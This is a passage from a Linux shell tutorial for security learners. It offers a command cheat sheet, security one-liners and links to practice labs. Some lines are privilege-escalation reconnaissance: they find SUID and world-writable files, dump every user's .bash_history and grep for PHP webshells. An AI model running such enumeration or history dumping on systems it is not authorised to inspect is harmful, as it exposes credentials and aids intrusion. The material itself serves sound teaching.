grep -A 3 "pattern" file          # 3 lines after each match
grep "p1\|p2" file                # match p1 OR p2
grep -E "p1|p2" file              # same with extended regex

# ── FIND ────────────────────────────────────────────────────────
find / -name "filename" 2>/dev/null          # find by name
find / -iname "*.conf" 2>/dev/null           # case-insensitive
find / -type f -perm /4000 2>/dev/null       # SUID files
find / -type f -perm -o+w 2>/dev/null        # world-writable files
find / -user root -type f 2>/dev/null        # root-owned files
find / -mtime -1 -type f 2>/dev/null         # modified last 24h
find / -newer /etc/passwd 2>/dev/null        # newer than passwd
find / -size +100M 2>/dev/null               # files > 100MB
find / -nouser -type f 2>/dev/null           # orphaned files
find /path -name "*.php" | xargs grep -l "exec"  # find+grep combo

# ── PIPES & REDIRECTION ─────────────────────────────────────────
cmd > file                        # stdout to file (overwrite)
cmd >> file                       # stdout to file (append)
cmd 2>/dev/null                   # discard errors
cmd &> file                       # stdout + stderr to file
cmd1 | cmd2 | cmd3                # pipeline
sort | uniq -c | sort -rn         # frequency count

# ── TEXT PROCESSING ─────────────────────────────────────────────
cut -d: -f1 /etc/passwd           # field 1, delimiter :
cut -d: -f1,3                     # fields 1 and 3
awk '{print $1}'                  # print 1st whitespace field
awk -F: '{print $1}'              # set delimiter to :
awk -F: '$3 == 0' /etc/passwd     # UID 0 users (root)
sed 's/old/new/g' file            # global replace
sed -n '5,10p' file               # print lines 5-10
wc -l file                        # count lines
tr 'a-z' 'A-Z'                    # uppercase
sort -u file                      # sort and deduplicate

# ── FILE MANAGEMENT ─────────────────────────────────────────────
touch file                        # create empty file
mkdir -p a/b/c                    # create nested directories
cp -r src/ dst/                   # copy directory recursively
cp -a src/ dst/                   # copy, preserve all attributes
mv old new                        # rename/move
rm -rf dir/                       # delete directory (no confirmation!)
shred -u -n 3 file                # secure delete
ln -s target link                 # symbolic link
ln target hardlink                # hard link

# ── ARCHIVES ────────────────────────────────────────────────────
tar -czf out.tar.gz /dir/         # create gzipped archive
tar -xzf archive.tar.gz           # extract
tar -tzf archive.tar.gz           # list contents
zip -r archive.zip directory/     # create zip
unzip archive.zip -d /output/     # extract zip

# ── SECURITY ONE-LINERS ─────────────────────────────────────────
# Top IPs from Apache log:
awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -rn | head

# Failed SSH logins with IPs:
grep "Failed password" /var/log/auth.log | grep -oP "from \K[\d.]+" | sort | uniq -c | sort -rn

# Find PHP webshells:
grep -rn "shell_exec\|system\|exec\|passthru" /var/www/ --include="*.php"

# Users that can log in:
grep -v "nologin\|false\|sync" /etc/passwd | cut -d: -f1

# All readable history files:
find /home /root -name ".bash_history" 2>/dev/null | xargs cat

# Network connections:
ss -tlnp
cat /proc/net/tcp
```

---

## Part 14: Practice Labs & Resources

### Start Here

1. **OverTheWire — Bandit** (the best shell practice that exists): [overthewire.org/wargames/bandit](https://overthewire.org/wargames/bandit)
   - Level 0–5: navigation, reading files, hidden files
   - Level 5–10: find with -size, -executable, -readable
   - Level 10–20: pipes, grep, encoding

2. **TryHackMe — Linux Fundamentals Part 2 & 3**: Guided rooms that cover exactly this material with interactive terminals.

3. **HackTheBox — Starting Point (Tier 0)**: First machines require basic Linux navigation on a real server.

### Advanced Challenges

- **cmdchallenge.com** — solve real tasks using only the command line; ranked by elegance
- **Shell scripting exercises at exercism.io** — practice writing actual scripts

### Keep on Your Desktop

Make a local copy of this chapter's cheat sheet. Print it if you want. For the next 3 months, whenever you find yourself reaching for a file manager GUI, stop and do it in the shell instead. Discomfort is the mechanism of learning.

---

> In nect chapter - Linux Permissions Deep Dive — chmod, chown, umask, SUID/SGID/Sticky bits. You've seen the permission column in `ls -la` and heard SUID mentioned twice already. Tomorrow you'll understand every bit of it, and more importantly, how permission misconfigurations become the most common Linux privilege escalation vulnerabilities.
